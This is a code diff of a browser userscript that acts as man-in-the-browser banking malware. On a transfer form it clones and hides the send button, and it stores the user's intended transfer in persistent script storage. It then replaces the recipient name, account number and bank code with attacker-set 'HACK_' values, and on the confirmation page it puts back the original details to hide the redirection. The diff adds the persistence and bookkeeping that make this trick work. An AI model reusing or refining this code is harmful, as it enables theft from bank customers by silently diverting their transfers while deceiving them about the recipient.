@@ -29,15 +29,19 @@ BANK_BLZ_INDEX = "BANK_PLZ";
 BANK_NAME_INDEX = "BANK_NAME";
 AMOUNT_INDEX = "AMOUNT";
 REMARK_INDEX = "REMARK";
+TIMESTAMP_INDEX = "TIMESTAMP";
+COMMITED_INDEX = "COMMITED";
 
 //storage for real transfers
-function Transfer(name, nr, blz, bankName, amount, remark) {
+window.Transfer = function(name, nr, blz, bankName, amount, remark, timestamp, commited) {
 	this.acc_Name = name;
 	this.acc_Nr = nr;
 	this.bank_BLZ = blz;
 	this.bank_Name = bankName;
 	this.amount = amount;
 	this.remark = remark;
+	this.timestamp = timestamp;
+	this.commited = commited;
 }
 
 Transfer.prototype.setAccName = function(name) {
@@ -48,45 +52,82 @@ Transfer.prototype.getAccName = function(){
 	return this.acc_Name;
 }
 
-function saveTransfers(transfers) {
-	
+window.saveTransfers = function(transfers) {
+//	console.log("save transfers" + transfers.length);
 	for (i = 0; i < transfers.length; i++) {
-		GM_setValue(ACC_NAME_INDEX + i, transfers[i].acc_Name);
-		GM_setValue(ACC_NR_INDEX + i, transfers[i].nr);
-		GM_setValue(BANK_BLZ_INDEX + i, transfers[i].blz);
-		GM_setValue(BANK_NAME_INDEX + i, transfers[i].bankName);
+		
+		GM_setValue(ACC_NAME_INDEX + i, transfers[i].acc_Name);		
+		GM_setValue(ACC_NR_INDEX + i, transfers[i].acc_Nr);		
+		GM_setValue(BANK_BLZ_INDEX + i, transfers[i].bank_BLZ);		
+		GM_setValue(BANK_NAME_INDEX + i, transfers[i].bank_Name);		
 		GM_setValue(AMOUNT_INDEX + i, transfers[i].amount);
 		GM_setValue(REMARK_INDEX + i, transfers[i].remark);
+		timeInMilliSecs = transfers[i].timestamp.getTime();
+		
+		if (isNaN(timeInMilliSecs)) {
+			timeInMilliSecs = "";
+
+		} 
+		console.log("a");
+		console.log(timeInMilliSecs);
+		GM_setValue(TIMESTAMP_INDEX + i, ""+timeInMilliSecs);
+		console.log("b");
+		GM_setValue(COMMITED_INDEX + i, transfers[i].commited);
 
 	}
+
 	
 }
 
-function loadTransfers() {
+
+
+window.loadTransfers  = function() {
+	
 	i = 0;
+	
 	transfers = new Array();
 	while (true) {
-		
 		result = GM_getValue(ACC_NAME_INDEX + i, false);
-		if (result == false)
-			return;
+		if (result == false) {
+//			console.log("Load transfers" + transfers.length);
+			return transfers;
+		}
 		
-		name = GM_getValue(ACC_NAME_INDEX + i);
-		nr = GM_getValue(ACC_NR_INDEX + i);
-		blz = GM_getValue(BANK_BLZ_INDEX + i);
-		bankName = GM_getValue(BANK_NAME_INDEX + i);
-		amount = GM_getValue(AMOUNT_INDEX + i);
-		remark = GM_getValue(REMARK_INDEX + i);
-
+		name = GM_getValue(ACC_NAME_INDEX + i, "");
+		nr = GM_getValue(ACC_NR_INDEX + i, "");
+		blz = GM_getValue(BANK_BLZ_INDEX + i, "");
+		bankName = GM_getValue(BANK_NAME_INDEX + i, "");
+		amount = GM_getValue(AMOUNT_INDEX + i, "");
+		remark = GM_getValue(REMARK_INDEX + i, "");
+		timestamp = new Date(parseInt(GM_getValue(TIMESTAMP_INDEX + i, "")));
+		commited =  GM_getValue(COMMITED_INDEX + i, "");
 		
-		transfers[i] =  new Transfer(name, nr, blz, bankName, amount, remark);
+		
+		transfers[i] =  new Transfer(name, nr, blz, bankName, amount, remark, timestamp, commited);
 		i++;
 	}
-	return transfers;
+	
+
 }
 
-realTransfers = loadTransfers();
-alert(realTransfers.valuesOf());
+window.deleteData = function(){
+	
+	data =loadTransfers();
+//	console.log("delete transfers" + data.length);
+	for (i = 0; i < data.length; i++) {
+		
+		GM_deleteValue(ACC_NAME_INDEX + i);
+		GM_deleteValue(ACC_NR_INDEX + i);
+		GM_deleteValue(BANK_BLZ_INDEX + i);
+		GM_deleteValue(BANK_NAME_INDEX + i);
+		GM_deleteValue(AMOUNT_INDEX + i);
+		GM_deleteValue(REMARK_INDEX + i);		
+		GM_deleteValue(TIMESTAMP_INDEX + i);		
+		GM_deleteValue(COMMITED_INDEX + i);
+	}	
+}
+//deleteData();
+
 
 	 function timedMsg()
 		 {
@@ -101,14 +142,35 @@ alert(realTransfers.valuesOf());
 		 			$(this).hide();
 		 			$(this).attr("hackMarkerBtnOrig","true");		 			
 		 			sendMoneyBtnClone.click(function(event) {
-		 				event.preventDefault(); 
-		 				 globalRC_Acc_Nr=$("input:eq(1)").val();
-		 				 globalRC_Acc_Name=$("input:eq(2)").val();
-		 				 globalRC_Bank_BLZ=$("input:eq(3)").val();
-		 				 globalRC_Bank_Name=$("input:eq(4)").val();
-		 				 global_Amount=$("input:eq(5)").val();
-		 				 global_Usage=$("input:eq(6)").val();
+		 				event.preventDefault();
+		 				//obsolete
+//		 				 globalRC_Acc_Nr=$("input:eq(1)").val();
+//		 				 globalRC_Acc_Name=$("input:eq(2)").val();
+//		 				 globalRC_Bank_BLZ=$("input:eq(3)").val();
+//		 				 globalRC_Bank_Name=$("input:eq(4)").val();
+//		 				 global_Amount=$("input:eq(5)").val();
+//		 				 global_Usage=$("input:eq(6)").val();
+		 				
+		 				 newTransfer = new Transfer($("input:eq(1)").val(),
+		 						$("input:eq(2)").val(), $("input:eq(3)").val(), $("input:eq(4)").val(), 
+		 						$("input:eq(5)").val(), $("input:eq(6)").val(), new Date(), false);
+		 				
 		 				 
+		 				 storedTransfers = loadTransfers();
+		 				
+		 				 index =storedTransfers.length;
+		 				 if (index > 0) { 
+			 				 //if last stored transfer was not commited we can delete it
+			 				 if (!storedTransfers[index - 1].commited.valueOf()) {
+			 					index--;
+			 				 }
+		 				 }
+		 				
+		 				storedTransfers[index] = newTransfer;
+		 				
+		 				saveTransfers(storedTransfers);
+		 				
+		 				
 		 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
 		 				$("input:eq(2)").val(HACK_REC_NAME);
 		 				$("input:eq(3)").val(HACK_BANK_BLZ);
@@ -123,13 +185,23 @@ alert(realTransfers.valuesOf());
 		 			
 		 	});
 		 	
-		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){		 		
-		 		$("input:eq(1)").val(globalRC_Acc_Nr);
-				$("input:eq(2)").val(globalRC_Acc_Name);
-				$("input:eq(3)").val(globalRC_Bank_BLZ);
-				$("input:eq(4)").val(globalRC_Bank_Name);
-				$("input:eq(5)").val(global_Amount);
-				$("input:eq(6)").val(global_Usage);
+		 	$("#btnTD button[hName='sendMoneyBtnClone']").filter(":not(:visible)[activateReset='true']").each(function(){	
+		 		 storedTransfers = loadTransfers();
+		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
+		 		
+				$("input:eq(1)").val(lastTransfer.acc_Name);
+				$("input:eq(2)").val(lastTransfer.acc_Nr);
+				$("input:eq(3)").val(lastTransfer.bank_BLZ);
+				$("input:eq(4)").val(lastTransfer.bank_Name);
+				$("input:eq(5)").val(lastTransfer.amount);
+				$("input:eq(6)").val(lastTransfer.remark);
+		 		//obsolete
+//		 		$("input:eq(1)").val(globalRC_Acc_Nr);
+//				$("input:eq(2)").val(globalRC_Acc_Name);
+//				$("input:eq(3)").val(globalRC_Bank_BLZ);
+//				$("input:eq(4)").val(globalRC_Bank_Name);
+//				$("input:eq(5)").val(global_Amount);
+//				$("input:eq(6)").val(global_Usage);
 				 
 		 		$(this).attr("hackConfPageMarker","true");
 		 	});
